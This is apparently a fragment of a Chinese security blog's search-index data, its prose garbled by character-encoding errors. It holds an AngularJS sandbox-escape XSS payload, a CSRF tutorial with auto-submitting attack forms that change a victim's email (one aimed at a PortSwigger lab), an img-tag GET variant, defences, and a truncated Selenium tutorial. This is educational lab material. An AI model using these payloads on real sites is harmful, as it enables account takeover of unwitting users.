c=&#x27;&#x27;.sub.call;b=&#x27;&#x27;.sub.bind;a=&#x27;&#x27;.sub.apply;   c.$apply=$apply;c.$eval=b;op=$root.$$phase;   $root.$$phase=null;od=$root.$digest;$root.$digest=(&#123;&#125;).toString;   C=c.$apply(c);$root.$$phase=op;$root.$digest=od;   B=C(b,c,b);$evalAsync(&quot;   astNode=pop();astNode.type=&#x27;UnaryExpression&#x27;;   astNode.operator=&#x27;(window.X?void0:(window.X=true,alert(1)))+&#x27;;   astNode.argument=&#123;type:&#x27;Identifier&#x27;,name:&#x27;foo&#x27;&#125;;   &quot;);   m1=B($$asyncQueue.pop().expression,null,$root);   m2=B(C,null,m1);[].push.apply=m2;a=&#x27;&#x27;.sub;   $eval(&#x27;a(b.c)&#x27;);[].push.apply=a;&#125;&#125;\n\n&gt;=1.6.0\né©¬é‡Œå¥¥Â·æµ·å¾·é‡Œå¸Œ (Cure53)\n&#123;&#123;constructor.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;\n\nè¯·è®¿é—®ç½‘ç»œå­¦é™¢ AngularJS å®éªŒå®¤ä»¥ä½¿ç”¨ AngularJS æ¥è¯•éªŒ XSSã€‚\n","tags":["Web","XSS"]},{"title":"Web_CSRF","url":"/2022/08/26/CSRF/","content":"æ¯”è¾ƒç®€å•çš„æ´ï¼Œå…¶å®åœ¨CTFshowå¹³å°ä¸Šï¼Œè¿™éƒ¨åˆ†é¢˜ç›®ç›´æ¥æ”¾åœ¨xssäº†ï¼Œå½“ç„¶è¿™éƒ¨åˆ†å’ŒXSSä¹Ÿéå¸¸ç›¸ä¼¼ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†HTMLå’ŒJS\nCSRFæ˜¯ä»€ä¹ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œå…è®¸æ”»å‡»è€…è¯±å¯¼ç”¨æˆ·æ‰§è¡Œä»–ä»¬ä¸æ„¿æ„æ‰§è¡Œçš„æ“ä½œã€‚å…è®¸æ”»å‡»è€…éƒ¨åˆ†è§„é¿åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ—¨åœ¨é˜²æ­¢ä¸åŒç½‘ç«™ä¹‹é—´ç›¸äº’å¹²æ‰°ã€‚\nç®€è¨€ä¹‹ï¼Œå†’å……ç”¨æˆ·ï¼Œåšä¸€äº›æ¶æ„è¯·æ±‚ï¼Œä¼ªè£…ç”¨æˆ·è¿›è¡Œæ¶æ„æ“ä½œã€‚\n\nCSRFæ”»å‡»çš„å½±å“åœ¨æˆåŠŸçš„CSRFæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šå¯¼è‡´å—å®³è€…ç”¨æˆ·æ— æ„æ‰§è¡ŒæŸé¡¹æ“ä½œã€‚ä¾‹å¦‚ï¼Œæ”¹å—å®³ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€ã€æ”¹å—å®³ç”¨æˆ·çš„å¤´åƒã€ä¸ªæ€§ç­¾åï¼Œç”šè‡³æ˜¯å¯ä»¥ä¿®æ”¹ä»–çš„å¯†ç è¿›è¡Œèµ„é‡‘è½¬è´¦ã€‚åƒCTFshow_XSSåè¾¹å‡ ä¸ªé¢˜å°±æ˜¯å¦‚æ­¤ã€‚å¦‚æœå—å®³ç”¨æˆ·æ˜¯adminï¼Œé‚£ä¹ˆèƒ½è¿›è¡Œçš„æ“ä½œå¯èƒ½æ›´å¤šã€‚\nCSRFå¦‚ä½•å·¥ä½œCSRFè¦æƒ³å­˜åœ¨ï¼Œå¿…é¡»å…·å¤‡ä¸‰ä¸ªå…³é”®æ¡ä»¶ï¼Œæ‰€ä»¥è¯´è¿™ç§æ´ä¹Ÿæ˜¯å¾ˆå°‘ã€‚\nï¼‘ã€ç½‘ç«™ä¸­å­˜åœ¨ç”¨æˆ·å¯ç™»å½•çš„åœ°æ–¹ï¼Œå¦‚æœå°±æ˜¯ä¸ªçº¯é™æ€çš„ç½‘ç«™ï¼Œè¿ç”¨æˆ·ç™»å½•ç‚¹éƒ½æ²¡æœ‰ï¼Œé‚£ä¸€åˆ‡éƒ½æ˜¯ç©ºè°ˆã€‚\nï¼’ã€æ‰§è¡Œè¯¥æ“ä½œæ—¶æ¶‰åŠå‘å‡ºä¸€ä¸ªæˆ–è€…å¤šä¸ªHTTPè¯·æ±‚ï¼Œå¹¶ä¸”ç½‘ç«™ä»…ä¾èµ–cookieæ¥è¯†åˆ«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æœºåˆ¶å¯ç”¨äºè¿½è¸ªä¼šè¯æˆ–éªŒè¯ç”¨æˆ·è¯·æ±‚ã€‚è€Œä¸”è¿™ä¸ªcookieå¿…é¡»è¦èƒ½åˆ©ç”¨åˆ°å…¶ä»–ç«™ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬è¦è·¨ç«™ï¼Œå¦‚æœcookieä¸èƒ½è·Ÿèµ°ï¼Œé‚£ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆç”¨çš„ï¼Œæ¯”å¦‚è¯´httponlyå’ŒSameSiteéƒ½ä¼šé˜»ç¢æˆ‘ä»¬çš„CSRFå’ŒXSS\nï¼“ã€æ‰§è¡ŒCSRFæ“ä½œçš„è¯·æ±‚ä¸åŒ…å«æ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–çŒœæµ‹å…¶å€¼çš„ä»»ä½•å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå½“å¯¼è‡´ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œéœ€è¦çŸ¥é“ç°æœ‰çš„å¯†ç ï¼Œé‚£ä¹ˆè‡ªç„¶æ˜¯æ— æ³•å®ç°ã€‚\nä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªç½‘ç«™åŒ…å«ä¸€ä¸ªå…è®¸ç”¨æˆ·æ›´æ”¹è‡ªå·±è´¦æˆ·ä¸Šçš„ç”µå­é‚®ç®±åœ°å€çš„åŠŸèƒ½ã€‚ç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œæ—¶å€™ã€‚ä¼šå‘å‡ºå¦‚ä¸‹HTTPè¯·æ±‚ï¼š\n\nPOST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 30Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE\nemail=&#99;&#x68;&#97;&#x72;&#109;&#x65;&#x72;&#x73;&#x69;&#120;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#111;&#x6d;\n\nè¿™ä¸ªä¾‹å­å°±ç¬¦åˆä¸Šè¿°ä¸‰ä¸ªæ¡ä»¶ï¼Œ\n\n è¯¥ç½‘ç«™å­˜åœ¨ç™»é™†ç‚¹ï¼Œè‡³å°‘å¯ä»¥ç”¨Emailç™»å½•\n å°±è¿™ä¸€ä¸ªCookieç‰µè¿ç€\n æ²¡æœ‰å…¶ä»–å› ç´ å½±å“æ”»å‡»è€…\n\né‚£ä¹ˆå°±å¯ä»¥å¼€å§‹æ”»å‡»ä»–äº†ï¼Œæ„å»ºä¸€ä¸ªHTMLç½‘é¡µï¼Œlike this\n&lt;html&gt;    &lt;body&gt;        &lt;form action=&quot;https://vulnerable-website.com/email/change&quot; method=&quot;POST&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@evil-user.net&quot; /&gt;        &lt;/form&gt;        &lt;script&gt;            document.forms[0].submit();        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\né‚£ä¹ˆä½ ä¸€å®šå¥½å¥‡ï¼Œè¿™äº›éƒ½è¦è‡ªå·±å†™å—ï¼Œå¯ä¸å¯ä»¥ä¸€é”®æ—¥å«æ˜Ÿï¼Œå½“ç„¶å¯ä»¥ã€‚\nè¿™ä¸ªä¸‹é¢ä¼šç»“åˆé¶åœºå…·ä½“è®²ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªå°ğŸŒ°è€Œå·²\né‚£ä¹ˆè¿™æ—¶å€™å—å®³è€…è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µï¼Œä»–ä»¬åœ¨å­˜åœ¨csrfæ¼æ´çš„ç½‘ç«™çš„é‚®ç®±å°±ä¼šæ”¹å˜æˆæ”»å‡»è€…çš„é‚®ç®±\npwned@evil-user.net\n\nå°tips\nå°½ç®¡csrfé€šå¸¸è¢«æè¿°ä¸ºä¸åŸºäºcookieçš„ä¼šè¯å¤„ç†ç›¸å…³ï¼Œä½†å®ƒä¹Ÿå‡ºç°åœ¨åº”ç”¨ç¨‹åºè‡ªåŠ¨å°†ä¸€äº›ç”¨æˆ·å‡­æ®æ·»åŠ åˆ°è¯·æ±‚çš„å…¶ä»–ä¸Šä¸‹æ–‡ä¸­ï¼Œä¾‹å¦‚httpåŸºæœ¬èº«ä»½éªŒè¯å’ŒåŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯ã€‚\n\næ„å»ºCSRFæ”»å‡»ä»ä¸Šè¾¹ğŸŒ°ä¸­èƒ½çœ‹å‡ºï¼Œæˆ‘ä»¬è‡ªå·±å»æ‰‹åŠ¨å†™CSRFæ¼æ´åˆ©ç”¨çš„HTMLå¯èƒ½ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œç‰¹åˆ«æ˜¯æ‰€éœ€çš„è¯·æ±‚åŒ…å«å¤§é‡å‚æ•°æˆ–è¯·æ±‚ä¸­æœ‰å…¶ä»–éº»çƒ¦çš„æƒ…å†µä¸‹ã€‚æ„å»ºCSRFä¸€é”®æ—¥ğŸ›°çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨burp suiteå†…ç½®çš„CSRF PoC ç”Ÿæˆå™¨\nè¿™è¾¹æˆ‘ä»¬æ¥ä¸€ä¸ªç®€å•çš„é¶åœºï¼Œä¸»è¦æ˜¯è¯´ä¸€ä¸‹bpçš„ä½¿ç”¨ã€‚\né¶åœºæˆ‘ä»¬é€‰ç”¨çš„æ˜¯burpå®˜ç½‘çš„é¶åœºcsrfç¬¬äºŒé¢˜\næˆ‘ä»¬æŠ“åŒ…æ”¹é‚®ç®±çœ‹ä¸€ä¸‹ï¼Œä¼šå‘ç°è¿™é‡Œè¾¹ç»‘å®šäº†cookieå’Œä¸€ä¸ªtokenä¹Ÿå°±æ˜¯å†…ä¸ªCSRF=\nç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªcookieæœ‰ä»€ä¹ˆè§„å¾‹ï¼Œå†æ”¹ä¸€ä¸‹\n\nç»è¿‡æµ‹è¯•ï¼Œæˆ‘ä»¬å‘ç°ï¼ŒæŠŠä¼ è¾“æ–¹å¼æ”¹æˆGETï¼Œtokenå°±æ²¡ä»€ä¹ˆåµç”¨äº†\n\nå°±å¯ä»¥ç”Ÿæˆä¸€ä¸ªpoc\nåœ¨è¿™ä¸ªé€‰é¡¹é‡Œå¯ä»¥å‹¾é€‰è‡ªåŠ¨æäº¤\n\nå½“ç„¶è¦è‡ªåŠ¨æäº¤äº†ï¼Œå†è®©å—å®³è€…å»ç‚¹å‡»æäº¤ï¼Œä¸æ˜¯æ·»éº»çƒ¦å˜›\næˆ‘ä»¬ç›´æ¥å¤åˆ¶ä¸‹æ¥html\n&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;    &lt;form action=&quot;https://0ae30021031005aac00448e6001b00b9.web-security-academy.net/my-account/change-email&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;charmersix@gmail.com&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;script&gt;      document.forms[0].submit();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\nè¿™é‡Œæˆ‘ä»¬è¦æŠŠé‚®ç®±æ”¹æˆæ”»å‡»è€…çš„é‚®ç®±\næˆ‘ä»¬æ¥åˆ°è¿™ä¸ªexploit serverï¼ŒæŠŠè¿™å¨HTMLå¤åˆ¶åˆ°æ¡†é‡Œ\n\nç„¶åç‚¹å‡»æ¼æ´åˆ©ç”¨\n\nCSRFæ¼æ´åˆ©ç”¨\nCSRFä¸XSSçš„åŸç†åŸºæœ¬ç›¸åŒã€‚é€šå¸¸ï¼Œæ”»å‡»è€…ä¼šå°†æ¶æ„HTMLæ”¾ç½®åˆ°ä»–ä»¬æ§åˆ¶çš„ç½‘ç«™ä¸Šï¼Œç„¶åè¯±å¯¼å—å®³è€…è®¿é—®è¯¥ç½‘ç«™ã€‚è¿™å¯ä»¥ é€šè¿‡ç”µå­é‚®ä»¶æˆ–ç¤¾äº¤åª’ä½“æ¶ˆæ¯å‘ç”¨æˆ·æä¾›ç½‘ç«™é“¾æ¥æ¥å®Œæˆã€‚æˆ–è€…å¦‚æœæ”»å‡»è¢«æ”¾ç½®åœ¨ä¸€ä¸ªæµè¡Œçš„ç½‘ç«™ä¸­ï¼ˆä¾‹å¦‚ï¼ŒæŸç”¨æˆ·è¯„è®ºåŒºï¼‰ï¼Œä»–ä»¬å°±ç­‰ç€æœ‰ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™ã€‚\nè¯·æ³¨æ„ï¼Œä¸€äº›ç®€å•çš„CSRFæ¼æ´åˆ©ç”¨ä½¿ç”¨GETæ–¹å¼ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ç½‘ç«™ä¸Šä½¿ç”¨å•ä¸ªURLå®Œå…¨è‡ªåŒ…å«ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¸éœ€è¦å¤–éƒ¨ç«™ç‚¹ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥å‘å—å®³è€…æä¾›æ˜“å—æ”»å‡»ä¸Šçš„æ¶æ„URLï¼åœ¨å‰é¢çš„ä¾‹å­ä¸­ï¼Œå¦‚æœå¯ä»¥ä½¿ç”¨GETæ–¹æ³•æ‰§è¡Œæ›´æ”¹ç”µå­é‚®ç®±åœ°å€çš„è¯·æ±‚ï¼Œé‚£ä¹ˆè‡ªåŒ…å«æ”»å‡»å¦‚ä¸‹æ‰€ç¤ºï¼š\n&lt;img src=&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;&gt;\n\né˜²æ­¢CSRFæ”»å‡»é˜²å¾¡CSRFæ”»å‡»çš„æœ€å¯é æ–¹æ³•æ˜¯åœ¨ç›¸å…³è¯·æ±‚ä¸­åŒ…å«CSRFã€€ï½”ï½ï½‹ï½…ï½ã€‚\nå¹¶ä¸”tokenè¦æ»¡è¶³ä¸‹é¢ä¸‰ä¸ªæ¡ä»¶ï¼š\n\n å¯¹äºä¸€èˆ¬çš„tokenï¼Œå€¼æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚\n sessionç»‘å®šåˆ°ç”¨æˆ·\n æ‰§è¡Œç›¸å…³æ“ä½œä¹‹å‰ï¼Œtokenä¸€ç›´èƒ½ç»è¿‡éªŒè¯\n\næœ€å¸¸è§çš„é˜²å¾¡å°±æ˜¯samesiteã€€cookie\nå¸¸è§çš„CSRFæ¼æ´CSRFä¸€èˆ¬å‡ºç°åœ¨é‚®ç®±ä¿®æ”¹ï¼Œè½¬è´¦ä¿®æ”¹\næœ€æœ‰è¶£çš„CSRFæ¼æ´ç”±äºtokenéªŒè¯é”™è¯¯å¼•èµ·ã€‚\nåœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾applicationç°åœ¨åœ¨æ›´æ”¹ç”¨æˆ·ç”µå­é‚®ç®±çš„è¯·æ±‚ä¸­åŒ…å«ä¸€ä¸ªCSRFtokenï¼š\n\nPOST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 68Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm\ncsrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&amp;email=&#x77;&#105;&#101;&#x6e;&#x65;&#114;&#64;&#x6e;&#111;&#114;&#109;&#x61;&#x6c;&#45;&#x75;&#115;&#101;&#114;&#x2e;&#x63;&#111;&#109;\n\nè¿™ç§çœ‹èµ·æ¥å¯ä»¥é˜²å¾¡CSRFæ”»å‡»ï¼Œå› ä¸ºå®ƒä¸å…·å¤‡CSRFå­˜åœ¨çš„æ¡ä»¶ï¼šç½‘ç«™ä¸ä»…ä»…ä¾èµ–äºcookieè¿›è¡Œä¼šè¯å¤„ç†ï¼Œå¹¶ä¸”è¯·æ±‚åŒ…å«ä¸€ä¸ªæ”»å‡»è€…æ— æ³•ç¡®å®šå…¶å€¼çš„å‚æ•°ã€‚ç„¶è€Œï¼Œæœ‰å¤šç§æ–¹æ³•å¯ä»¥æ‰“ç ´é˜²å¾¡ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰è¢«CSRFæ”»å‡»çš„å¯èƒ½ã€‚\nè¿˜æœ‰å¾ˆå¤šå…·ä½“çš„æƒ…å†µï¼Œï½‚ï½é¶åœºé‡Œä¹Ÿæ˜¯æœ‰çš„ã€‚\nCSRFè¿˜æ˜¯å¾ˆç®€å•çš„ï¼ŒåŸç†ä¹Ÿæ¯”è¾ƒå¥½ç†è§£ï¼Œå…·ä½“ç»•è¿‡å§‹ç»ˆä¹Ÿç¦»ä¸å¼€cookieï¼Œtokenï¼Œè¯·æ±‚å¤´ä¹‹ç±»çš„ã€‚\n","tags":["Web","CSRF"]},{"title":"Python_Selenium_Study","url":"/2023/03/08/Python_Selenium%E5%AD%A6%E4%B9%A0/","content":"åœ¨ä¸€åˆ‡çš„å¼€å§‹,å…ˆæ„Ÿè°¢ç™½æœˆé»‘ç¾½å¸ˆå‚…\nè¿™æ˜¯å¸ˆå‚…çš„blog:https://www.byhy.net/\nè¿™æ˜¯å¸ˆå‚…çš„Bç«™:https://space.bilibili.com/401981380\næ¨èå¤§å®¶å»çœ‹ç™½æœˆé»‘ç¾½å¸ˆå‚…çš„åŸæ–‡å’Œè§†é¢‘è¿™ç¯‡åªæ˜¯ä¸ªäººç¬”è®°\nseleniumåŸç†seleniumè‡ªåŠ¨åŒ–ç¨‹åº+æµè§ˆå™¨é©±åŠ¨(è½¬å‘æŒ‡ä»¤)æ§åˆ¶æµè§ˆå™¨\nç¯å¢ƒé…ç½®é¦–å…ˆå®‰è£…python, è¿™é‡Œä¸å†èµ˜è¿°,ç„¶åå®‰è£…seleniumåº“\npip install selenium\n\nå®‰è£…chromeæµè§ˆå™¨åŠå…¶é©±åŠ¨\næˆ–è€…æ˜¯å¯ä»¥é€‰æ‹©edgeæµè§ˆå™¨åŠå…¶é©±åŠ¨\nç®€å•å®ä¾‹from selenium import webdriverfrom selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome(service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://charmersix.icu&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€input()\n\n\nå½“ç„¶æˆ‘ä»¬å¯ä»¥å°†chromedriveråŠ ä¸€ä¸ªç¯å¢ƒå˜é‡,å°±å¯ä»¥ä¸åœ¨ä»£ç é‡Œç‚¹æ˜è·¯å¾„\nlike this\nfrom selenium import webdriver#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://charmersix.icu&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€input()\n\né€‰æ‹©å…ƒç´ çš„åŸºæœ¬æ–¹æ³•å¯ä»¥é€šè¿‡å…ƒç´ çš„idé€‰æ‹©,ä½†æ˜¯è¿™ä¸ªidå¿…é¡»æ˜¯å½“å‰é¡µé¢å”¯ä¸€çš„,å¦‚æœä¸ç¡®å®šæ˜¯å¦æ˜¯å”¯ä¸€çš„,å¯ä»¥é€šè¿‡æœç´¢åŠŸèƒ½è¯•ä¸€ä¸‹\n\nå¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œè™½ç„¶æœå‡ºæ¥äº†ä¹ä¸ª,å®é™…ä¸Šid=&quot;kw&quot;åªæœ‰ä¸€ä¸ª\næˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å®ä¾‹å®ç°ä¸€ä¸‹\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://baidu.com&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€element = wd.find_element(By.ID,&#x27;kw&#x27;)#æ ¹æ®idé€‰æ‹©å…ƒç´ ï¼Œè¿”å›çš„å°±æ˜¯è¯¥å…ƒç´ å¯¹åº”çš„webelementå¯¹è±¡element.send_keys(&#x27;Charmersix\\n&#x27;)#åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å›è½¦æœç´¢\n\n\nbingä¹Ÿæ˜¯ä¸€æ ·\nä¸Šè¾¹æ —å­é‡‡ç”¨çš„å›è½¦æœç´¢,å¦‚æœæˆ‘ä»¬å›è½¦æ— æ³•æœç´¢éœ€è¦ç‚¹å‡»çš„è¯,æˆ‘ä»¬å¯ä»¥ç”¨clickæ–¹æ³•,è¿˜æ˜¯é€šè¿‡idç­›é€‰æœç´¢å…ƒç´ å»ç‚¹å‡»è¿™ä¸ªå…ƒç´ \nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cn.bing.com/&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€element = wd.find_element(By.ID,&#x27;sb_form_q&#x27;)#æ ¹æ®idé€‰æ‹©å…ƒç´ ï¼Œè¿”å›çš„å°±æ˜¯è¯¥å…ƒç´ å¯¹åº”çš„webelementå¯¹è±¡element.send_keys(&#x27;Charmersix&#x27;)#åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å›è½¦æœç´¢search = wd.find_element(By.ID,&#x27;search_icon&#x27;)search.click()\n\n\nå¦‚æœæˆ‘ä»¬æƒ³è¦ç­›é€‰çš„è¿™ä¸ªå…ƒç´ ã€æ ‡ç­¾é‡Œæ²¡æœ‰id,æˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥æ ¹æ®å…¶ä»–æ–¹æ³•æ¥é€‰æ‹©çš„,æ¯”æ–¹è¯´classå±æ€§æˆ–è€…æ˜¯æ ‡ç­¾å\nè¿™é‡Œå€Ÿç”¨ä¸€ä¸‹ç™½æœˆé»‘ç¾½å¸ˆå‚…çš„ç½‘ç«™\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_elements(By.CLASS_NAME, &#x27;animal&#x27;)#è¿™é‡Œæ¢ç”¨äº†elements, å¦‚æœæ˜¯elementåªèƒ½é€‰æ‹©å‡ºç¬¬ä¸€ä¸ªå…ƒç´ , è€Œelementså¯ä»¥å°†ä¸‰ä¸ªéƒ½é€‰å‡ºæ¥#æ ¹æ®class nameé€‰æ‹©å…ƒç´ ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨for element in elements:    print(element.text)#å°†ç­›é€‰çš„å†…å®¹æ‰“å°å‡ºæ¥\n\n\næ ¹æ®æ ‡ç­¾åä¹Ÿæ˜¯ä¸€æ ·\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_elements(By.TAG_NAME, &#x27;span&#x27;)#æ ¹æ®æ ‡ç­¾é€‰æ‹©å…ƒç´ ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨for element in elements:    print(element.text)#å°†ç­›é€‰çš„å†…å®¹æ‰“å°å‡ºæ¥\n\n\nWebDriverå¯¹è±¡é€‰æ‹©å…ƒç´ çš„èŒƒå›´æ˜¯æ•´ä¸ªwebé¡µé¢ï¼Œè€ŒWebElementå¯¹è±¡é€‰æ‹©çš„èŒƒå›´æ˜¯å…ƒç´ å†…éƒ¨ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¥—å¨ƒæ–¹æ³•é€‰æ‹©åˆ°æ›´å…·ä½“çš„ã€æ›´ç²¾ç¡®çš„ä¿¡æ¯\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_element(By.ID, &#x27;container&#x27;)#é€šè¿‡idé€‰æ‹©ç‰¹å®šå…ƒç´ spans = elements.find_elements(By.TAG_NAME, &#x27;span&#x27;)#æ ¹æ®æ ‡ç­¾é€‰æ‹©å…ƒç´ ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨for span in spans:    print(span.text)#å°†ç­›é€‰çš„å†…å®¹æ‰“å°å‡ºæ¥\n\n\nç­‰å¾…å…ƒç´ å‡ºç°è¿™ä¸ªæ¨¡å—ä¸»è¦æ˜¯ç”¨äºæœç´¢åŠŸèƒ½åå†æŸ¥æ‰¾æå–å†…å®¹åˆ©ç”¨sleep\nä¾‹å¦‚,æˆ‘è¿™é‡Œè¦æå–å‡ºæˆ‘ä»bingä¸­æœå‡ºçš„å…³äºCharmersixçš„ç½‘ç«™\nimport timefrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# åˆ›å»º WebDriver å¯¹è±¡ï¼ŒæŒ‡æ˜ä½¿ç”¨chromeæµè§ˆå™¨é©±åŠ¨wd.get(&#x27;https://cn.bing.com/&#x27;)# è°ƒç”¨WebDriver å¯¹è±¡çš„getæ–¹æ³• å¯ä»¥è®©æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘å€elements = wd.find_element(By.ID, &#x27;sb_form_q&#x27;)#é€šè¿‡idé€‰æ‹©ç‰¹å®šå…ƒç´ elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.ID, &#x27;search_icon&#x27;)search.click()time.sleep(5)#ç»™ç½‘ç«™ä¸€ä¸ªååº”çš„æ—¶é—´ï¼Œç„¶åç»§ç»­æå–æƒ³è¦çš„å†…å®¹cites = wd.find_elements(By.TAG_NAME, &#x27;cite&#x27;)#æ ¹æ®æ ‡ç­¾é€‰æ‹©å…ƒç´ ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨for cite in cites:    print(cite.text)#å°†ç­›é€‰çš„å†…å®¹æ‰“å°å‡ºæ¥\n\n\nè¿™é‡Œçš„sleep(5)æ¯”è¾ƒé•¿, 